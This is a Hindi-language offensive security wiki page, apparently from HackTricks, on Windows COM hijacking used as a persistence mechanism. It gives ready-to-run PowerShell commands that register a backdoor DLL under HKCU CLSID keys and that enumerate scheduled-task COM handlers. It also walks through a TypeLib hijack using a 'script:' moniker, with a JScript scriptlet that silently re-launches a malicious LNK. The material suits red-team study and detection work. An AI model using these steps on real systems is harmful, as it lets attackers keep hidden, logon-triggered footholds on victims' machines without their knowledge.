# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### मौजूद नहीं वाले COM घटकों की खोज

चूंकि HKCU के मान उपयोगकर्ताओं द्वारा संशोधित किए जा सकते हैं, **COM Hijacking** को एक **स्थायी तंत्र** के रूप में उपयोग किया जा सकता है। `procmon` का उपयोग करके उन COM रजिस्ट्री प्रविष्टियों को ढूँढना आसान है जो मौजूद नहीं हैं और जिन्हें attacker persistence के लिए बना सकता है। फिल्टर:

- **RegOpenKey** operations.
- जहाँ _Result_ **NAME NOT FOUND** हो।
- और _Path_ **InprocServer32** पर समाप्त होता हो।

एक बार जब आप तय कर लें कि किस मौजूद नहीं वाले COM का impersonate करना है, तो निम्नलिखित commands चलाएँ। _यदि आप ऐसा COM impersonate करने का निर्णय लेते हैं जो हर कुछ सेकंड में लोड होता है तो सावधान रहें क्योंकि यह overkill हो सकता है._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### हाइजैक करने योग्य Task Scheduler के COM components

Windows Tasks Custom Triggers का उपयोग COM objects को कॉल करने के लिए करते हैं, और चूँकि इन्हें Task Scheduler के माध्यम से execute किया जाता है, इसलिए यह अनुमान लगाना आसान होता है कि इन्हें कब trigger किया जाएगा.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

आउटपुट की जाँच करके आप उदाहरण के लिए ऐसा चुन सकते हैं जो **हर बार कोई उपयोगकर्ता लॉग इन करता है** तब execute होगा।

अब CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** को **HKEY\CLASSES\ROOT\CLSID** और HKLM व HKCU में खोजने पर, आम तौर पर आप पाएँगे कि यह मान HKCU में मौजूद नहीं होता है।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
फिर, आप बस HKCU एंट्री बना सकते हैं और हर बार जब उपयोगकर्ता लॉग इन करेगा, आपका backdoor सक्रिय हो जाएगा।

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) COM interfaces को परिभाषित करते हैं और `LoadTypeLib()` के माध्यम से लोड होते हैं। जब कोई COM सर्वर इंस्टेंस बनाया जाता है, तो OS संबंधित TypeLib को भी लोड कर सकता है — इसके लिए यह `HKCR\TypeLib\{LIBID}` के तहत रजिस्ट्री कीज़ की जांच करता है। यदि TypeLib path को एक **moniker** से बदल दिया जाता है, उदाहरण के लिए `script:C:\...\evil.sct`, तो जब TypeLib resolve होगा तो Windows उस scriptlet को execute कर देगा — जिससे एक छिपी हुई persistence बन जाती है जो सामान्य कंपोनेंट्स के इस्तेमाल होने पर ट्रिगर होती है।

यह Microsoft Web Browser control के खिलाफ देखा गया है (जो अक्सर Internet Explorer, apps embedding WebBrowser, और यहां तक कि `explorer.exe` द्वारा लोड होता है)।

### Steps (PowerShell)

1) उस TypeLib (LIBID) की पहचान करें जिसका उपयोग किसी high-frequency CLSID द्वारा किया जाता है। उदाहरण के तौर पर अक्सर malware chains द्वारा दुरुपयोग किया जाने वाला CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) प्रति-उपयोगकर्ता TypeLib पथ को स्थानीय scriptlet की ओर `script:` मोनाइकर का उपयोग करके पॉइंट करें (कोई एडमिन अधिकार आवश्यक नहीं):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) एक न्यूनतम JScript `.sct` गिराएँ जो आपके प्राथमिक payload को फिर से लॉन्च करे (उदा. प्रारंभिक chain द्वारा उपयोग किया गया `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE खोलना, कोई ऐसा एप्लिकेशन जो WebBrowser control को embed करता है, या यहाँ तक कि सामान्य Explorer activity भी TypeLib को लोड करेगा और scriptlet को execute करेगा, जिससे आपकी chain logon/reboot पर पुनः सक्रिय हो जाएगी।

सफाई
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
नोट

- आप वही लॉजिक अन्य बार-बार उपयोग होने वाले COM घटकों पर भी लागू कर सकते हैं; हमेशा पहले वास्तविक `LIBID` को `HKCR\CLSID\{CLSID}\TypeLib` से रिज़ॉल्व करें।
- 64-bit सिस्टम्स पर आप 64-bit consumers के लिए `win64` सबकी भी भर सकते हैं।

## संदर्भ

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
